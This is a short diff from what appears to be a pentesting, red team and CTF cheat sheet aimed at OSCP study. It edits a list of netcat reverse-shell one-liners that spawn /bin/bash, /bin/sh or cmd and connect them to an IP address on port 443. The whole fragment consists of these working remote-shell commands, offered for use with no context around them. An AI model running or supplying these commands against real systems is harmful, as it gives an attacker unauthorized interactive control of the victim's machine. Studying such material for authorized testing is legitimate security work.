@@ -20,7 +20,9 @@ __Pentesting - Red Team - CTFs - OSCP__
 
   nc -e /bin/bash 192.168.1.2 443
 
-  nc -c bash 192.168.1.2 443
+  nc -c /bin/sh 192.168.1.2 443
+  
+  nc -c /bin/bash 192.168.1.2 443
   
   nc.exe -e cmd 192.168.1.26 443
 
